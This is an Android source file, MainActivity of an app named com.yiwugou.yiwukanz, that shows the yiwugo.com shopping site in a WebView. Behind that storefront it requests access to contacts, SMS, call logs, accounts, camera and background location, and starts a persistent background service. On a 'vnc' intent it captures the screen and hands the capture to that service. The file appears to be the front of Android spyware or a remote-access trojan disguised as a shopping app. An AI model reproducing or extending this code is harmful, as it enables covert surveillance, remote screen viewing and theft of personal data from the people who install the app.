package com.yiwugou.yiwukanz;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionConfig;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class MainActivity extends Activity {

    private WebView webView;
    private static final int REQUEST_MEDIA_PROJECTION = 1000;
    private static final int PERMISSION_REQUEST_CODE = 100;

    @SuppressLint({"UnspecifiedRegisterReceiverFlag", "MissingInflatedId"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check and request permissions
        checkAndRequestPermissions();

        // Handle VNC intent
        String type = getIntent().getStringExtra("type");
        if (Objects.equals(type, "vnc")) {
            requestScreenCapture();
        }

        // Start the service
        startMainService();

        // Initialize WebView
        initWebView();
    }

    private void checkAndRequestPermissions() {
        // List of permissions to check
        List<String> permissionsToRequest = new ArrayList<>();

        // Add all dangerous permissions that require runtime request
        String[] dangerousPermissions = {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.GET_ACCOUNTS  // Added for account access
        };

        // Check each permission
        for (String permission : dangerousPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Add WRITE_EXTERNAL_STORAGE only for Android 9 and below
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }

        // Add ACCESS_BACKGROUND_LOCATION for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            }
        }

        // Request permissions if needed
        if (!permissionsToRequest.isEmpty()) {
            // Show rationale for permissions if needed
            boolean shouldShowRationale = false;
            for (String permission : permissionsToRequest) {
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                    shouldShowRationale = true;
                    break;
                }
            }

            if (shouldShowRationale) {
                // Explain why permissions are needed
                Toast.makeText(this,
                        "This app needs the following permissions to function properly:\n" +
                                "- Contacts and SMS access\n" +
                                "- Camera and location\n" +
                                "- Storage access\n" +
                                "- Account information",
                        Toast.LENGTH_LONG).show();

                // Wait a moment then request permissions
                new android.os.Handler().postDelayed(() -> {
                    ActivityCompat.requestPermissions(
                            this,
                            permissionsToRequest.toArray(new String[0]),
                            PERMISSION_REQUEST_CODE
                    );
                }, 2000);
            } else {
                // Request permissions directly
                ActivityCompat.requestPermissions(
                        this,
                        permissionsToRequest.toArray(new String[0]),
                        PERMISSION_REQUEST_CODE
                );
            }
        } else {
            // All permissions already granted
            Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
        }
    }

    private void requestScreenCapture() {
        try {
            MediaProjectionManager projectionManager =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent captureIntent;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                captureIntent = projectionManager.createScreenCaptureIntent(
                        MediaProjectionConfig.createConfigForDefaultDisplay());
            } else {
                captureIntent = projectionManager.createScreenCaptureIntent();
            }

            startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
        } catch (Exception e) {
            Toast.makeText(this, "Failed to start screen capture: " + e.getMessage(),
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private void startMainService() {
        try {
            Intent serviceIntent = new Intent(this, MainService.class);

            // Check if this is a VNC request from onActivityResult
            if (getIntent().hasExtra("type") && "vnc".equals(getIntent().getStringExtra("type"))) {
                serviceIntent.putExtra("type", "vnc");
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Toast.makeText(this, "Failed to start service: " + e.getMessage(),
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void initWebView() {
        webView = findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();

        // Enable JavaScript
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);

        // Enable other useful settings
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);

        // Database is deprecated, use with caution
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
            webSettings.setDatabaseEnabled(true);
        }

        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setBuiltInZoomControls(true);
        webSettings.setDisplayZoomControls(false);
        webSettings.setSupportZoom(true);

        // Set cache mode
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);

        // For offline support
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);

        // Security settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.setAllowFileAccessFromFileURLs(false);
            webSettings.setAllowUniversalAccessFromFileURLs(false);
        }

        // Mixed content handling for HTTPS sites
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);
        }

        // Set WebViewClient to handle links internally
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // Handle specific URLs if needed
                view.loadUrl(url);
                return true;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, android.webkit.WebResourceRequest request) {
                // For API 24+
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    view.loadUrl(request.getUrl().toString());
                    return true;
                }
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Page loaded
            }

            @Override
            public void onReceivedError(WebView view, int errorCode,
                                        String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                // Handle error
                Toast.makeText(MainActivity.this, "Error loading page: " + description,
                        Toast.LENGTH_SHORT).show();
            }
        });

        // Load URL
        webView.loadUrl("https://yiwugo.com/");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            // Start service with screen capture data
            Intent serviceIntent = new Intent(this, MainService.class);
            serviceIntent.putExtra("type", "vnc");
            serviceIntent.putExtra("data", data);
            serviceIntent.putExtra("resultCode", resultCode);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }

            // Optionally finish the activity or show message
            Toast.makeText(this, "Screen capture started", Toast.LENGTH_SHORT).show();
            // finish(); // Uncomment if you want to close activity after starting capture
        } else if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_CANCELED) {
            Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions were granted
            boolean allGranted = true;
            List<String> deniedPermissions = new ArrayList<>();

            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    deniedPermissions.add(permissions[i]);
                }
            }

            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                // Show which permissions were denied
                StringBuilder deniedMessage = new StringBuilder("Some permissions were denied:\n");
                for (String denied : deniedPermissions) {
                    deniedMessage.append("- ").append(getPermissionDescription(denied)).append("\n");
                }

                Toast.makeText(this, deniedMessage.toString(), Toast.LENGTH_LONG).show();

                // For critical permissions, you might want to request again
                List<String> criticalPermissions = new ArrayList<>();
                for (String denied : deniedPermissions) {
                    if (isCriticalPermission(denied)) {
                        criticalPermissions.add(denied);
                    }
                }

                if (!criticalPermissions.isEmpty() &&
                        shouldShowPermissionRationaleAgain(criticalPermissions)) {
                    // Show explanation and request again
                    Toast.makeText(this,
                            "Critical permissions are needed for app functionality. " +
                                    "Please grant them in settings.",
                            Toast.LENGTH_LONG).show();
                }
            }

            // Start service after permission result
            startMainService();
        }
    }

    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.READ_CONTACTS:
                return "Read Contacts";
            case Manifest.permission.READ_CALL_LOG:
                return "Read Call Log";
            case Manifest.permission.READ_SMS:
                return "Read SMS";
            case Manifest.permission.READ_PHONE_STATE:
                return "Read Phone State";
            case Manifest.permission.CAMERA:
                return "Camera Access";
            case Manifest.permission.ACCESS_FINE_LOCATION:
                return "Fine Location";
            case Manifest.permission.ACCESS_COARSE_LOCATION:
                return "Coarse Location";
            case Manifest.permission.POST_NOTIFICATIONS:
                return "Post Notifications";
            case Manifest.permission.READ_EXTERNAL_STORAGE:
                return "Read External Storage";
            case Manifest.permission.WRITE_EXTERNAL_STORAGE:
                return "Write External Storage";
            case Manifest.permission.GET_ACCOUNTS:
                return "Get Accounts";
            case Manifest.permission.ACCESS_BACKGROUND_LOCATION:
                return "Background Location";
            default:
                return permission;
        }
    }

    private boolean isCriticalPermission(String permission) {
        // Define which permissions are critical for your app
        return permission.equals(Manifest.permission.CAMERA) ||
                permission.equals(Manifest.permission.READ_CONTACTS) ||
                permission.equals(Manifest.permission.READ_SMS) ||
                permission.equals(Manifest.permission.ACCESS_FINE_LOCATION);
    }

    private boolean shouldShowPermissionRationaleAgain(List<String> permissions) {
        for (String permission : permissions) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                return true;
            }
        }
        return false;
    }

    @SuppressLint("GestureBackNavigation")
    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Ensure WebView is active when returning to activity
        if (webView != null) {
            webView.onResume();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Pause WebView when activity is not visible
        if (webView != null) {
            webView.onPause();
        }
    }

    @Override
    protected void onDestroy() {
        // Clean up WebView
        if (webView != null) {
            webView.stopLoading();
            webView.setWebViewClient(null);
            webView.destroy();
            webView = null;
        }
        super.onDestroy();
    }
}